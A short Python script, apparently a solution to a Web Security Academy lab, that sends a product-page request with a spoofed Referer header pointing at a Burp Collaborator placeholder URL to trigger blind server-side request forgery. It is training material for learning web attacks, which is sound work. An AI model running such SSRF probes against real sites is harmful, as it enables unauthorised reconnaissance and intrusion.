import requests

site = "0a4000e9049690b180564e05007d007c.web-security-academy.net"
product_url = f"https://{site}/product?productId=1"

# Makeshift Burp Collaborator payload
collaborator_payload = "https://your-collaborator-id.burpcollaborator.net"

# Send GET request with forged Referer header to trigger SSRF
headers = {
    "Referer": collaborator_payload
}
resp = requests.get(product_url, headers=headers)

print("[✓] Request sent with spoofed Referer header.")
print(f"[i] Status code: {resp.status_code}")
print("[!] Now check Burp Collaborator for the out-of-band interaction.")
